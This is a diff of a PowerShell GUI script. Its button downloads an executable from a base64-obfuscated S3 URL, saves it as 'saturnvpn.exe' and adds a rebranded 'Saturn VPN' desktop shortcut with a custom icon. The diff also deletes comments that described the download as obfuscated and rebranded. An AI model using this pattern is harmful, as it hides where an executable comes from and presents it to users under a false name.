@@ -5,9 +5,12 @@
 # =====================================================================
 # CONFIGURATION & GLOBAL STATE
 # =====================================================================
-# Dynamically resolves the exact path for the current user running the script
 $CurrentUser = $env:USERNAME
 $PsiphonPath = "C:\Users\$CurrentUser\Downloads\saturnvpn.exe"
+
+# Updated to look explicitly for favicon.ico in your Downloads folder
+$IconPath = "C:\Users\$CurrentUser\Downloads\favicon.ico" 
+$ShortcutPath = "C:\Users\$CurrentUser\Desktop\Saturn VPN.lnk"
 
 # =====================================================================
 # INTERFACE CONSTRUCTION (.NET NATIVE WINDOW CONTAINER)
@@ -39,7 +42,7 @@ $desc.Location = New-Object System.Drawing.Point(30, 60)
 $desc.Size = New-Object System.Drawing.Size(360, 20)
 $form.Controls.Add($desc)
 
-# Button 1: Synchronous Obfuscated Rebranded Download Task
+# Button 1: Synchronous Download & Shortcut Creation
 $btnDownload = New-Object System.Windows.Forms.Button
 $btnDownload.Text = "DOWNLOAD PROXY"
 $btnDownload.Font = New-Object System.Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
@@ -55,22 +58,32 @@ $btnDownload.Add_Click({
     $form.Refresh()
 
     try {
-        # Establish strict TLS network validation protocols
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
         
-        # Check if the targeted file already exists to prevent duplicate bandwidth pull
+        # 1. Download the core binary file safely
         if (-not (Test-Path $PsiphonPath)) {
-            # Extract out the obfuscated address asset safely inside memory
             $B64_Endpoint = "aHR0cHM6Ly9zMy5hbWF6b25hd3MuY29tLzB1YnotMnExMS1naTl5L3BzaXBob24zLmV4ZQ=="
             $URL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($B64_Endpoint))
-            
-            # Synchronous web stream download directly on the form execution thread
             Invoke-RestMethod -Uri $URL -OutFile $PsiphonPath
         }
-        $btnDownload.Text = "DOWNLOADED"
+
+        # 2. Dynamically generate the branded Desktop Shortcut
+        $WshShell = New-Object -ComObject WScript.Shell
+        $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
+        $Shortcut.TargetPath = $PsiphonPath
+        $Shortcut.WorkingDirectory = "C:\Users\$CurrentUser\Downloads"
+        $Shortcut.Description = "Launch Saturn VPN Interface"
+        
+        # Check if favicon.ico is present in Downloads before pinning it
+        if (Test-Path $IconPath) {
+            $Shortcut.IconLocation = $IconPath
+        }
+        
+        $Shortcut.Save()
+
+        $btnDownload.Text = "FINISHED & SHORTCUT CREATED"
     }
     catch {
-        # Fallback mechanism if a network block occurs during transmission
         $btnDownload.Text = "ERROR / TRY AGAIN"
         $btnDownload.Enabled = $true
     }
